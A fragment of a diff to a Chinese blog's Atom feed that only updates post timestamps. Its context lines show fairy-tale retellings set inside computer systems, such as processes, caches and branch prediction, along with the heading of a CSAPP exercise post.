-    <updated>2025-08-10T11:22:22.912Z</updated>
+    <updated>2026-07-17T07:53:25.458Z</updated>
     
     <content type="html"><![CDATA[<p>小王子活动的空间很小，这个pid为612的进程只有十六位的地址空间。虽然操作系统总是大手大脚地分配虚拟地址，但对小王子来说，十六位已经足够，<br>
 我们也不需要去纠结为什么64位的系统上会有如此狭小的内存空间了。</p>
@@ -14901,7 +15098,7 @@ globals<span class="token punctuation">.</span><span class="token function">set<
     <link href="https://aucept.in/2025/05/22/%E7%9D%A1%E7%BE%8E%E4%BA%BA/"/>
     <id>https://aucept.in/2025/05/22/%E7%9D%A1%E7%BE%8E%E4%BA%BA/</id>
     <published>2025-05-21T16:17:06.000Z</published>
-    <updated>2025-06-22T08:22:51.268Z</updated>
+    <updated>2026-07-17T07:53:25.465Z</updated>
     
     <content type="html"><![CDATA[<p>从前有一个国王，在一个进程上运行多年一直没有孩子。他每天向操作系统请求，希望给他一个孩子。</p>
 <p>有一天，王后做着循环时，惊讶地发现自己做了一个错误的分支预测，清理掉错误的命令，她来到了一处未曾访问的内存，听见操作系统对她说，“你的愿望就要实现了，很快你就会有一个女孩。”</p>
@@ -14944,7 +15141,7 @@ globals<span class="token punctuation">.</span><span class="token function">set<
     <link href="https://aucept.in/2025/05/17/%E7%8B%BC%E6%9D%A5%E4%BA%86/"/>
     <id>https://aucept.in/2025/05/17/%E7%8B%BC%E6%9D%A5%E4%BA%86/</id>
     <published>2025-05-17T02:02:02.000Z</published>
-    <updated>2025-06-22T08:24:04.669Z</updated>
+    <updated>2026-07-17T07:53:25.463Z</updated>
     
     <content type="html"><![CDATA[<p>从前，有个放羊娃，每天都沿着I/O桥去CPU放羊</p>
 <p>一天，他看到有一个数据读，头也不回地跑到主存大声喊：“读来了！读来了！快缓存啊！”主存一收到数据读的信号，急忙把一块数据拿出来放到总线上，然后往L3、L2、L1层层缓存，边准备边喊：“不要怕，孩子，SRAM会帮你的！”</p>
@@ -14982,7 +15179,7 @@ globals<span class="token punctuation">.</span><span class="token function">set<
     <link href="https://aucept.in/2025/05/13/CSAPP-3-69/"/>
     <id>https://aucept.in/2025/05/13/CSAPP-3-69/</id>
     <published>2025-05-13T11:20:00.000Z</published>
-    <updated>2025-06-25T02:01:27.522Z</updated>
+    <updated>2026-07-17T07:53:25.430Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目：">题目：</h2>
 <p><img src="../image/CSAPP_3.69_1.png" alt="p1"></p>
